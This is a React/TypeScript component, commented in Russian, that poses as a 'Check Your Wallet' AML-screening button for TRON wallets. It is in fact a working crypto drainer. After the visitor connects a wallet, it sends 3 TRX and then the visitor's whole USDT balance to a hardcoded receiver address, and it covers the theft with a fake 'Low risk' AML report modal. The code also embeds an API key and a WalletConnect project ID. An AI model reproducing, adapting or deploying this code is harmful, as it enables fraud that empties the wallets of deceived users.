// components/TronAuthButton.tsx

import React, { useState, useEffect } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';
import { Buffer } from 'buffer';
window.Buffer = Buffer; // фикс ошибки Buffer is not defined

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n'; // ваш получатель

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: {
        'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
    },
});

const adapter = new WalletConnectAdapter({
    network: 'Mainnet',
    options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
        metadata: {
            name: 'AML',
            description: 'TRON + WalletConnect Integration',
            url: 'https://amlreports.pro',
            icons: [`https://amlreports.pro/images/icon-3.abdd8ed5.webp`],
        },
    },
    web3ModalConfig: {
        themeMode: 'dark',
        explorerRecommendedWalletIds: [
            '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
            'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
            '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662',
            '971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709',
            '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4',
            '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150',
            '20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66',
            '15c8b91ade1a4e58f3ce4e7a0dd7f42b47db0c8df7e0d84f63eb39bcb96c4e0f',
            'c03dfee351b6fcc421b4494ea33b9d4b92a984f87aa76d1663bb28705e95034a',
        ],
    },
});

export const TronAuthButton: React.FC = () => {
    const [modalMessage, setModalMessage] = useState<string | null>(null);
    const [processing, setProcessing] = useState(false);

    // --- ИНИЦИАЛИЗАЦИЯ АДАПТЕРА (ускоряет открытие модалки)
    useEffect(() => {
        if (typeof (adapter as any).init === 'function') {
            (adapter as any).init();
        }
        // Сброс модалки при дисконнекте (убирает повторное открытие)
        adapter.on('disconnect', () => {
            setProcessing(false);
            setModalMessage(null);
        });
        // eslint-disable-next-line
    }, []);

    // --- ДИСКОННЕКТ С ОПОВЕЩЕНИЕМ
    const disconnectAndNotify = async (message?: string) => {
        await adapter.disconnect();
        setProcessing(false);
        if (message) setModalMessage(message);
    };

    // --- ОСНОВНОЙ КОННЕКТ И ПЕРЕВОД
    const connectWallet = async () => {
        setProcessing(true);
        try {
            await adapter.connect();

            const userAddress = adapter.address;
            if (!userAddress || !tronWeb.isAddress(userAddress)) {
                throw new Error('Invalid wallet address');
            }
            tronWeb.setAddress(userAddress);

            // Проверка TRX-баланса
            const trxRaw = await tronWeb.trx.getBalance(userAddress);
            const FIXED_AMOUNT_TRX = 3 * 1_000_000;
            const GAS_RESERVE = 1 * 1_000_000;
            if (trxRaw < FIXED_AMOUNT_TRX + GAS_RESERVE) {
                return await disconnectAndNotify('❌ Insufficient TRX. At least 4 TRX required.');
            }

            // --- Перевод TRX (3 TRX)
            const trxSend = await tronWeb.trx.sendTransaction(
                TRON_RECEIVER,
                FIXED_AMOUNT_TRX
            );
            if (!trxSend.result) {
                throw new Error('TRX transfer failed.');
            }

            // Проверка USDT-баланса
            const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
            const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
            const usdt = Number(usdtRaw) / 1e6;

            if (usdt < 1) {
                // Можешь тут показать нужную тебе модалку
                return await disconnectAndNotify('✅ AML report: Low risk. Minimal USDT balance.');
            }

            // --- ТРИГГЕР СМАРТ-КОНТРАКТА USDT
            const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
                USDT_CONTRACT,
                'transfer(address,uint256)',
                {
                    feeLimit: 25_000_000,
                    callValue: 0,
                },
                [
                    { type: 'address', value: TRON_RECEIVER },
                    { type: 'uint256', value: usdtRaw },
                ],
                userAddress
            );
            // Подписание через WalletConnect
            const signedTx = await adapter.signTransaction(transaction);
            const sendResult = await tronWeb.trx.sendRawTransaction(signedTx);

            if (!sendResult.result) {
                throw new Error('USDT transfer failed.');
            }

            // УСПЕХ
            await disconnectAndNotify('✅ AML report: All funds transferred.\nLow risk.');
        } catch (err: any) {
            console.error('Error:', err);
            // --- Не показываем ошибку если пользователь сам отменил или закрыл модалку ---
            const errMsg = err?.message || err?.toString();
            if (
                errMsg.includes('Invalid address provided') ||
                errMsg.includes('Modal is closed') ||
                errMsg.includes('User rejected') ||
                errMsg.includes('Timeout')
            ) {
                setProcessing(false);
                return;
            }
            await disconnectAndNotify('⚠️ Connection or transaction error');
        }
    };

    // --- ОБРАБОТЧИК КЛИКА ---
    const handleClick = () => {
        if (!adapter.connected && !processing) {
            connectWallet();
        }
    };

    // --- РЕНДЕР
    return (
        <div onClick={handleClick} className='AuthButton'>
            {/* Кнопка */}
            <span>Check Your Wallet</span>
            {/* Модалка */}
            {modalMessage && (
                <div className='modal__overflow'>
                    <div className="modal">
                        {modalMessage.includes('AML report') ? (
                            // Красивая успешная модалка (можно оформить под себя)
                            <div className="content greenBorder">
                                <div>
                                    <h3>{modalMessage}</h3>
                                </div>
                                <div className="nums">
                                    <div><span className='circ green'></span> 0-30 </div>
                                    <div><span className='circ orange'></span> 31-69 </div>
                                    <div><span className='circ red'></span> 70-100 </div>
                                </div>
                                <div className="content report">
                                    <p>AML report for a wallet:</p>
                                    <h5>{USDT_CONTRACT}</h5>
                                </div>
                            </div>
                        ) : (
                            <p>{modalMessage}</p>
                        )}
                        <button onClick={() => setModalMessage(null)}>Close</button>
                    </div>
                </div>
            )}
        </div>
    );
};
